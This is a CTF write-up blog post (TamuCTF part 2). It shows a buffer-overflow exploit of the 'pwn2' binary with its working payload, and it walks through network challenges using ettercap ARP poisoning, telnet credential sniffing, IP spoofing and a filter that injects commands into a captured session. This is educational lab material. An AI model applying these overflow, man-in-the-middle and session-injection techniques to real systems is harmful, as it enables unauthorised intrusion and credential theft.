---
layout: post
title: "TamuCTF writeups pt. 2"
categories: blog writeups re tamu
---

This is a continuation of my last post, TamuCTF writeups pt. 1. If you've not
read that yet, I suggest you do so. It took longer than I wanted to get the
motivation to write up the 2nd part so without further delay, let's get to the
challenges, starting with pwn2.

## The challenges

### pwn2 (pwn)

For this challenge, we are simply given a `netcat` command and a link to
download the binary, which I've mirrored [here]({{"assets/tamu/pwn2"|absolute_url}}).
The `netcat` command is used once we have found a successful exploit that we
want to run on the live version. For now, we'll just download the binary and
take a look.

```
-> % ./pwn2
I just love repeating what other people say!
I bet I can repeat anything you tell me!
hello, world!
hello, world!
```

So the binary takes user input, and spits it out. This means it's reading a
string into memory, at the very least. If the binary is using unsafe string
functions, we have a vector for stack overflows or something like that.
What happens if we fire a reasonably long string at it (starting somewhere
conservative like 256 characters)?

```
-> % ruby -e '(256).times{print "a"}' | ./pwn2
I just love repeating what other people say!
I bet I can repeat anything you tell me!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    16531 done                ruby -e '(256).times{print "a"}' | 
       16532 segmentation fault  ./pwn2
```

Brilliant! A segfault. This means we can pretty much guarantee it's doing something unsafe with the input we give it. Let's take a closer look at the code in `r2`.

First, we're going to create some input and a `rarun2` script to pass to `r2`,
which will allow us to provide the `pwn2` binary with input.

I like creating a string of sequential bytes because then when we analyse
the binary, we can easily spot how many bytes into the input started to cause
bad behaviour. But we have to stick to printable chars, so we don't accidentally
send it an `EOF` or something like that.

```
-> % ruby -e '(3).times{(94).times{|i| print (i+32).chr}}' > pwn2.txt
-> % cat pwn2.rr2 
#!/usr/bin/rarun2
stdin=./pwn2.txt
```

We can then invoke r2 as follows:

```
-> % r2 -wd ./pwn2 -e dbg.profile=pwn2.rr2
```

Time for the standard `aaa;pdf@sym.main` to see what `main()` is doing.

```
[0xf7f5cc70]> aaa;pdf @ sym.main
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 5817 5817
5817
            ;-- main:
/ (fcn) sym.main 87
|   sym.main ();
|           ; var int local_4h_2 @ ebp-0x4
|           ; var int local_4h @ esp+0x4
|              ; DATA XREF from 0x08048467 (entry0)
|           0x080485f6      8d4c2404       lea ecx, dword [local_4h]   ; 4
|           0x080485fa      83e4f0         and esp, 0xfffffff0
|           0x080485fd      ff71fc         push dword [ecx - 4]
|           0x08048600      55             push ebp
|           0x08048601      89e5           mov ebp, esp
|           0x08048603      51             push ecx
|           0x08048604      83ec04         sub esp, 4
|           0x08048607      a130a00408     mov eax, dword [obj.stdout] ; [0x804a030:4]=0
|           0x0804860c      6a00           push 0
|           0x0804860e      6a00           push 0
|           0x08048610      6a02           push 2                      ; 2
|           0x08048612      50             push eax
|           0x08048613      e8f8fdffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
|           0x08048618      83c410         add esp, 0x10
|           0x0804861b      83ec0c         sub esp, 0xc
|           0x0804861e      6800870408     push str.I_just_love_repeating_what_other_people_say ; 0x8048700 ; "I just love repeating what other people say!"
|           0x08048623      e8c8fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048628      83c410         add esp, 0x10
|           0x0804862b      83ec0c         sub esp, 0xc
|           0x0804862e      6830870408     push str.I_bet_I_can_repeat_anything_you_tell_me ; 0x8048730 ; "I bet I can repeat anything you tell me!"
|           0x08048633      e8b8fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048638      83c410         add esp, 0x10
|           0x0804863b      e872ffffff     call sym.echo
|           0x08048640      b800000000     mov eax, 0
|           0x08048645      8b4dfc         mov ecx, dword [local_4h_2]
|           0x08048648      c9             leave
|           0x08048649      8d61fc         lea esp, dword [ecx - 4]
\           0x0804864c      c3             ret
```

Hmm, no obvious calls to a `print_flag()` function or anything like that.
Thankfully, we can take a look at all the defined functions and see if there's
any functions defined but not called.

```
[0xf7fa2c70]> afl
0x08048390    3 35           sym._init
0x080483d0    1 6            sym.imp.gets
0x080483e0    1 6            sym.imp._IO_getc
0x080483f0    1 6            sym.imp.puts
0x08048400    1 6            sym.imp.__libc_start_main
0x08048410    1 6            sym.imp.setvbuf
0x08048420    1 6            sym.imp.fopen
0x08048430    1 6            sym.imp.putchar
0x08048440    1 6            sub.__gmon_start___252_440
0x08048450    1 33           entry0
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x08048490    4 43           sym.deregister_tm_clones
0x080484c0    4 53           sym.register_tm_clones
0x08048500    3 30           sym.__do_global_dtors_aux
0x08048520    4 43   -> 40   entry1.init
0x0804854b    4 103          sym.print_flag
0x080485b2    1 68           sym.echo
0x080485f6    1 87           sym.main
0x08048650    4 93           sym.__libc_csu_init
0x080486b0    1 2            sym.__libc_csu_fini
0x080486b4    1 20           sym._fini
```

Ooh, a print_flag function. That sounds very useful. So if we can set the stack
pointer to the address of this function, we should be in business. Let's run
the program with our new sketchy input and see what the `eip` is set to when
the program crashes.

```
[0xf7f9dc70]> dc
I just love repeating what other people say!
I bet I can repeat anything you tell me!
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|} !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|} !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x5a595857 code=1 ret=0
[0x5a595857]> drr
   eax 0x0000011b  eax
   ebx 0x00000000  edi
   ecx 0xf7f54dc7  (/lib/i386-linux-gnu/libc-2.27.so) ecx library R W 0xf558900a
   edx 0xf7f55890  (unk0) edx R W 0x0 -->  edi
   esi 0xf7f54000  (/lib/i386-linux-gnu/libc-2.27.so) esi library R W 0x1d4d6c
   edi 0x00000000  edi
   esp 0xff8f9ee0  esp stack R W 0x5e5d5c5b ([\]^_`abcdefghijklmnopqrstuvwxyz{|}) -->  ascii
   ebp 0x56555453  ebp ascii
   eip 0x5a595857  eip ascii
   xfs 0x00000000  edi
   xgs 0x00000063  ascii
   xcs 0x00000023  ascii
   xss 0x0000002b  ascii
eflags       1SIV  eflags
  oeax 0xffffffff  oeax
```

This certainly looks positive; the `eip` is set to some sequential bytes, which
means we're definitely on the right track. A quick look at [asciitable](https://www.asciitable.com/)
tells us the bytes 57-5a (remember, endianness!) are letters W to Z. Since I had
to repeat the sequential bytes 3 times to trigger the segfault (I did this while
you weren't looking), we know where in the input we need to manipulate.
The amount of characters before the final W-Z is 241.
Also, while you weren't looking I went ahead and made a local `flag.txt` file,
so that when we hit the `print_flag` function, we don't just error out.

It actually took a little trial-and-error to get the exact amount of padding
before the (reversed) address to the `print_flag` function, but I got there in
the end.

```
-> % ruby -e '(243).times{print "a"};print "\x4b\x85\x04\x08\n"' | ./pwn2
I just love repeating what other people say!
I bet I can repeat anything you tell me!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaK�
This function has been deprecated
flag{s3kritstestflag}

[1]    32584 done                ruby -e '(243).times{print "a"};print "\x4b\x85\x04\x08\n"' |
       32585 segmentation fault  ./pwn2
```

Awesome! Now let's try on the live version and see if we can get ourselves a flag.

```
-> % ruby -e '(243).times{print "a"};print "\x4b\x85\x04\x08\n"' | nc pwn.ctf.tamu.edu 4322

I just love repeating what other people say!
I bet I can repeat anything you tell me!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaK�
This function has been deprecated
gigem{3ch035_0f_7h3_p4s7}
```

Nice!

### Stop and listen (Network exploit)

By far my favourite challenges during this CTF were the network exploit
challenges. The way they were set up, you had to connect to a network using
OpenVPN, and do various tasks involving packet capture, MITM and ARP poisoning.
Given my background in computer networks, I found this all very good fun.

Anyway, onto the first challenge.

> Sometimes what we are looking for is right in front of us if we just take a moment to stop and listen.

We are then given instructions on how to connect to the network, and an OpenVPN
config.

First thing's first, let's connect to the network and open up wireshark to see
what's happening.

After running `openvpn listen.ovpn` and `dhclient tap0`, we are good to go.

![Stop and listen 1]({{ "/assets/tamu/net/1-1.png" | absolute_url }})

It looks like there's a UDP conversation going on. Let's check what information
is being transmitted by using wireshark's 'follow stream' feature.

![Stop and listen 2]({{ "/assets/tamu/net/1-2.png" | absolute_url }})

That was easy enough, nice!

### Stuck in the middle

>Clowns to the left of me, jokers to the right. Here I am....
There is someone else talking on this network, but you won't be able to hear them. Maybe there is some way to get in the middle of their conversation.

Immediately, it sounds like we're going to have to perform a man-in-the-middle
attack. We are provided another OpenVPN config. So let's connect, get an IP and
use wireshark to see what's going on.

![Stuck in the middle 1]({{"/assets/tamu/net/2-1.png" | absolute_url}})_

Hmm, nothing it seems. Well, that doesn't necessarily mean there's nothing going
on. There's a handy tool that can help us discover hosts on the network even if
they're not sending any broadcast traffic. We could set an ARP request to every
host on the network. Or we could use a tool to do that for us. Enter
[ettercap](http://www.ettercap-project.org/ettercap/).

Ettercap is a network analysis tool that (amongst other things) lets us scan
the network using ARP requests, intercept and modify data. Sounds like everything
we're going to need for this flag. So let's get started by first scanning the
network to look for hosts.

First, we select Sniff -> Unified Sniffing, then select the interface we wish
to sniff on (in this case it will be `tap0`). Then we select Hosts -> Scan for
Hosts, and press Ctrl+H to bring up the hosts list. We can see in the screenshot
that 3 hosts have been found. Awesome.

![Stuck in the middle 2]({{"/assets/tamu/net/2-2.png" | absolute_url}})_

In order to intercept the traffic being sent on the network, we will utilise a
technique called [Arp spoofing](https://en.wikipedia.org/wiki/ARP_spoofing),
whereby our machine spams the network with phony ARP requests telling the other
hosts on the network that the MAC address belonging to each IP is our MAC address,
thus we receive the traffic destined for other hosts. This will allow us to
man-in-the-middle any traffic on the network, and hopefully find us a flag
for the trouble.

In ettercap we can perform an ARP spoof by simply going to MIT -> ARP Poisoning.
Another dialog box will come up. Check the 'sniff remove connections' box and hit
OK. It's literally as simple as that. Wireshark makes it very apparent that some
ARP nastiness has gone on (see the screenshot).

Lots of ARP replies and lo-and-behold, traffic that wasn't there before!

![Stuck in the middle 3]({{"/assets/tamu/net/2-3.png" | absolute_url}})

If we follow the UDP stream, we can see a conversation between two parties. One
side is asking if they have the right flag, and eventually the other end answers
in the affirmate.

```
gigem{I_Got_tHE_fEeLiN_sOmetHInG_aint_RIGhT}Is this the flag
 gigem{I_Got_tHE_fEeLiN_sOmetHInG_aint_RIGhT}NopeNopeIs this the flag
 gigem{i_got_THe_fEeLiN_SoMEtHING_aiNt_rIghT}Is this the flag
 gigem{i_got_THe_fEeLiN_SoMEtHING_aiNt_rIghT}NopeNopeIs this the flag
 gigem{i_GoT_thE_feELIN_SOMeThInG_aiNT_RIgHt}Is this the flag
 gigem{i_GoT_thE_feELIN_SOMeThInG_aiNT_RIgHt}NopeNopeIs this the flag
 gigem{i_GOt_THe_fEELiN_SOMetHIng_aInt_RigHT}Is this the flag
 gigem{i_GOt_THe_fEELiN_SOMetHIng_aInt_RigHT}NopeNopeIs this the flag
 gigem{i_gOT_the_FeELIN_SoMEThinG_ainT_rIGHt}Is this the flag
 gigem{i_gOT_the_FeELIN_SoMEThinG_ainT_rIGHt}Yup, that's it!Yup, that's it!Is this the flag
 gigem{i_GOT_THE_FEElin_sOmetHing_Aint_riGhT}Is this the flag
 gigem{i_GOT_THE_FEElin_sOmetHing_Aint_riGhT}Is this the flag
 gigem{I_gOT_THE_feeLIN_sOmEthIng_AinT_rigHT}Is this the flag
 gigem{I_gOT_THE_feeLIN_sOmEthIng_AinT_rigHT}NopeNopeIs this the flag
 gigem{i_Got_THE_Feelin_SomEThINg_AInt_righT}Is this the flag
 gigem{i_Got_THE_Feelin_SomEThINg_AInt_righT}NopeNopeIs this the flag
 gigem{i_gOt_The_FEelIn_SomEThING_AINt_rIGhT}Is this the flag
 gigem{i_gOt_The_FEelIn_SomEThING_AINt_rIGhT}NopeNopeIs this the flag

```

Nice!

### Straw House

>In a land far far away (Fayetteville, Arkansas) there was an old mother pig who had three little pigs and not enough cpu cores to host them. So when they were old enough, she sent them out into the world to seek their fortunes.
The first little was very lazy and secured his server by not telling anyone about it. Honestly a wolf wouldn't need to huff and puff so much as sniff his way into the server.

Same as last time, we're given an OpenVPN file. Let's get connected and IP'd up
and take a look at this network.

This time I'm going to start with the Ettercap scan and spoof, to make things
a little quicker. Same as last time, the scan finds 3 hosts:

![Straw House 1]({{"/assets/tamu/net/3-1.png" | absolute_url}})

After spoofing and packet-sniffing, it looks like there's some Telnet traffic!

![Straw House 2]({{"/assets/tamu/net/3-2.png" | absolute_url}})

If we are able to intercept the authentication we'll be able to catch the password
and log in ourselves. After a little hunting of the different TCP streams, I
manage to find exactly what I'm looking for.

![Straw House 3]({{"/assets/tamu/net/3-3.png" | absolute_url}})

Looks like there's the file we need in there too (`.ctf_flag`). Let's use these
pilfered credentials to log in to the server.

```
-> % telnet 172.16.9.3
Trying 172.16.9.3...
Connected to 172.16.9.3.
Escape character is '^]'.
Ubuntu 16.04.3 LTS
10c025ebe78f login: piggy
Password:
Last login: Thu Apr  5 13:43:47 UTC 2018 on pts/1
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-1052-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
piggy@10c025ebe78f:~$ cat .ctf_flag
gigem{straw_houses_can_barely_stand_the_breeze}
piggy@10c025ebe78f:~$ logout
```

Nice!

### Stick house

>The second little piggy was a little more industrious, and decided to secure his server by making sure it only responded to him. I guess he never realized that wolves can lie.

Right off the bat, it sounds like we're going to have to do some IP spoofing.
Let's start with our standard connect, scan and spoof to see what's going on.

![Stick House 1]({{"/assets/tamu/net/4-1.png" | absolute_url}})

Same as last time, 3 IP addresses. Now for the packet sniffing

![Stick House 2]({{"/assets/tamu/net/4-2.png" | absolute_url}})

And same as last time, we were able to capture a telnet session including the
authentication. But something tells me we won't be able to log in. Oh well,
let's give it a try anyway. You never know.

```
-> % telnet 172.16.9.18
Trying 172.16.9.18...
Connected to 172.16.9.18.
Escape character is '^]'.
Connection closed by foreign host.
```

Oh well. I guess we'll have to do something different this time. The server
is going to expect the client's IP to be 172.16.9.18. What if we just make this
our IP and quickly try to log in? Surely not....

```
-> % sudo ip addr add dev tap0 172.16.9.19/28; telnet 172.16.9.18
RTNETLINK answers: File exists
Trying 172.16.9.18...
Connected to 172.16.9.18.
Escape character is '^]'.
Ubuntu 16.04.3 LTS
c4d2c12c9c30 login: piggy
Password: 
Last login: Thu Apr  5 14:06:02 UTC 2018 on pts/6
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-1052-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
piggy@c4d2c12c9c30:~$ cat .ctf_flag
gigem{trust_on_the_internet_is_a_way_to_get_eaten}
piggy@c4d2c12c9c30:~$ logout                                                  
Connection closed by foreign host.
```

Wow, that was far simpler than it ought've been. These piggies really need to
get better at securing their servers. Nice!

### Brick House

>This little piggy was a very hard worker and decided to roll his own two-factor authentication to keep the wolves out.

Rolling your own crypto. Fantastic. Well, as long as they're still using telnet,
this shouldn't be much of a problem. Let's take a look. Again, there are 3 hosts
on the network. We'll do some packet sniffing and then start taking a look at
our options.

![Brick House 1]({{"/assets/tamu/net/5-1.png" | absolute_url}})

As with the last two challenges, we were able to capture the authentication to
the server and thus gain the username and password. This two-factor auth method
looks a little scary though. We don't have the code or the binary for it, so
reverse engineering could pose quite the challenge. This one stumped me for
quite a while. The solution lies in the fact that Telnet doesn't verify that
the incoming packets are actually from the same host - as long as the IP matches,
it'll accept it. This means that if we can send a crafted packet containing the
command we want (`cat .ctf_flag`) at the right time (when the user is in their
home directory), we should be able to get the flag. We don't care whether the
server responds to us or not - we're intercepting all the traffic anyway.

Thankfully, there is a way to achieve this with our trusty friend Ettercap. Using
something called ettercap 'filters', we can use a fairly simple scripting engine
to perform replacements on the text that we want. I think the best candidate for
a command to replace is `ls -la`, since this seems to be a fairly common command
looking at the packet dump. And, more importantly, it is run in the directory we
care about (`/home/`). Here is how my ettercap filter ended up looking:

```
if (tcp.dst == 23) {
    if (search(DATA.data, "ls -la")) {
        replace("ls -la", "cat .ctf_flag");
        msg("zapped!\n");
    }
}
```

Before it can be used, this script needs to be compiled in to a `.ef` file
using the `etterfilter` command: `-> % etterfilter replace.filter replace.ef`. 

Now that we've got our filter, let's get it running and watch the output in
wireshark for what we want.

```
-> % sudo ettercap -T -q -F filter.ef -M ARP -i tap0 /172.16.9.36/172.16.9.35/
```
Now we just wait...

My replacement didn't seem to work perfectly - often I'd be watching the
captured packets and it'd seem to try to run the two commands at the same time,
or part of the command would overlap with the next command (see the below
screenshot).

![Brick House 2]({{"/assets/tamu/net/5-2.png" | absolute_url}})

Eventually, however, the planets aligned and the filter managed to work,
revealing the flag we so sought.

![Brick House 3]({{"/assets/tamu/net/5-3.png" | absolute_url}})

Nice!

This seems like a reasonable place to stop this part - I guess this is gonna be
a 3-parter. And hopefully the next part won't take as long to publish. I started
writing the last part on my honeymoon and since then and now, plenty of ~life~
things have gone on. Now that life is a little slower again, I'll hopefully
get this thing bashed out a little quicker. Maybe I'll even finish in time for
the next TamuCTF!
